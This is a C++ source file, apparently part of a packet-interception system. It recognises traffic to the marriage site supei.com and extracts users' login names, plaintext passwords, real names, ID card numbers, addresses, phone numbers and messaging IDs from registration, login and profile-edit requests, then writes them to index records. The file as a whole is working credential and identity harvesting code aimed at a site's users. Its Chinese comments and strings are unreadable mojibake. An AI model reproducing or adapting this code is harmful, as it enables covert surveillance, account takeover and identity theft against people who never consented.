
#include "StdAfx.h"
#include "MarriageSuPeiWang.h"

marriage::SuPeiWangMarriage::SuPeiWangMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "������";	
}

marriage::SuPeiWangMarriage::~SuPeiWangMarriage()
{
	
}

int marriage::SuPeiWangMarriage::IsSuPeiWangMarriage(HttpSession *http_session)
{
	//��ҳע��
	if((http_session->m_Requestline.m_Host.Find("www.supei.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/www/regstep0.jsp")!=-1)) 
	{
		return kPcWebRegister;
	}
	//��ҳ��¼
	if((http_session->m_Requestline.m_Host.Find("www.supei.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/www/login.jsp")!=-1)) 
	{
		return kPcWebLogin;

	}
	//��ҳ�޸�����

	if((http_session->m_Requestline.m_Host.Find("www.supei.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/www/regstep1.jsp")!=-1)) 
	{
		return kPcWebModiy;
	}
	return 0;
}

int marriage::SuPeiWangMarriage::Process(const char *packet,int action)
{
	//��ҳע��
	if (action == kPcWebRegister)
	{
		return PcWebRegister(packet);
	}
	//��ҳ��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//��ҳ�޸ĸ�������
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}
//pcע��
int marriage::SuPeiWangMarriage::PcWebRegister(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//�û���
	string username = ms_->GetValueFromMapByKey("loginid",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	//�ǳ�
	string name = ms_->GetValueFromMapByKey("nickname",true);
	//�Ա�
	string sex = ms_->GetValueFromMapByKey("gender",true);
	if (sex == "M"){sex ="��";}
	else{sex = "Ů";}
	//��������
	string data = ms_->GetValueFromMapByKey("year",true) + "��" +
		ms_->GetValueFromMapByKey("month",true) + "��" +
		ms_->GetValueFromMapByKey("day",true)+"��";
	//��ʵ����
	string truename = ms_->GetValueFromMapByKey("truename",true);
	//����
	string email = ms_->GetValueFromMapByKey("email",true);
	//֤������
	string idtype = ms_->GetValueFromMapByKey("idcardtype",true);
	if (idtype=="A"){idtype = "���֤";}
	if (idtype=="B"){idtype = "����";}
	if (idtype=="C"){idtype = "����֤";}
	//֤����
	string idno = ms_->GetValueFromMapByKey("idcardno",true);
	//��ַ
	string address = ms_->GetValueFromMapByKey("address",true);
	//�ֻ���
	string mobile = ms_->GetValueFromMapByKey("mobile",true);
	//��ʱͨѶ
	string icqtype = ms_->GetValueFromMapByKey("icqtype",true);
	if (icqtype=="A"){icqtype = "QQ";}
	if (icqtype=="C"){icqtype = "Yahoo";}
	if (icqtype=="D"){icqtype = "΢��";}
	string icqid = ms_->GetValueFromMapByKey("icqid",true);
	output_text_ = 
		"user=" +		username + "\r\n" +        //�û��� 
		"pass=" +		password + "\r\n" +        //���� 
		"msg=" + 		name + "\r\n" + 		   //�ǳ� 
		"mid=" +		truename + "\r\n" +        //����  
		"sex=" +		sex + "\r\n" +             //�Ա� 
		"onick=" +		data + "\r\n" +				//�������� 
		"servername=" +	idtype + "\r\n" + 		   //֤������      
		"appname=" + 	idno + "\r\n" + 		   //֤����
		"nick="	 + 	  	email + "\r\n" + 			//����
		"msgtype=" + 	icqtype + "\r\n" +			//ͨѶ����
		"subject=" + 	icqid + "\r\n" +			//ͨѶ��
		"islogin=" +    address + "\r\n" +			//��ַ
		"oid=" +		mobile + "\r\n" +			//�ֻ��� 
		"netmark=" +    app_ + "\r\n" +				//��Դ 
		"clientmsg=" +  platformWeb + "\r\n" +		//����ƽ̨
		"state=ע��" + "\r\n" ;						//״̬ 
		WriteIndexFile();
	return 1;
}

//web��¼
int marriage::SuPeiWangMarriage::PcWebLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	string username = ms_->GetValueFromMapByKey("loginid",true);
	string pwd = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || pwd.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" +          //�û���
		"pass=" + pwd + "\r\n" +               //����
		"netmark=" + app_ + "\r\n" + 		   //��Դ
		"clientmsg=" + platformWeb + "\r\n" +  //����ƽ̨
		"state=��¼\r\n";			           //״̬
	WriteIndexFile();
	return 1;
}

//��ϸ���ϸ�����Ϣ�޸�
int marriage::SuPeiWangMarriage::PcWebModiy(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//����
	string email = ms_->GetValueFromMapByKey("email",true);
	//����
	string name = ms_->GetValueFromMapByKey("truename",true);
	//֤������
	string idtype = ms_->GetValueFromMapByKey("idcardtype",true);
	if (idtype=="A"){idtype = "���֤";}
	if (idtype=="B"){idtype = "����";}
	if (idtype=="C"){idtype = "����֤";}
	//֤����
	string idno = ms_->GetValueFromMapByKey("idcardno",true);
	//��ַ
	string address = ms_->GetValueFromMapByKey("address",true);
	//��ʱͨѶ
	string icqtype = ms_->GetValueFromMapByKey("icqtype",true);
	if (icqtype=="A"){icqtype = "QQ";}
	if (icqtype=="C"){icqtype = "Yahoo";}
	if (icqtype=="D"){icqtype = "΢��";}
	string icqid = ms_->GetValueFromMapByKey("icqid",true);

	output_text_ = 
		"mid=" +		name+ "\r\n" +						//����  
		"servername=" + idtype + "\r\n" + 				   //֤������      
		"appname=" + 	idno + "\r\n" +					   //֤����
		"nick="	 + 	  	email + "\r\n" +				 	//����
		"msgtype=" + 	icqtype + "\r\n" +					//ͨѶ����
		"subject=" + 	icqid + "\r\n" +				    //ͨѶ��
		"islogin=" +    address + "\r\n" +					//��ַ
		"netmark=" +    app_ + "\r\n" +						//��Դ 
		"clientmsg=" +  platformWeb + "\r\n" +				//����ƽ̨
		"state=�޸ĸ�����Ϣ\r\n" ;							//״̬ 
		WriteIndexFile();
	return 1;
}

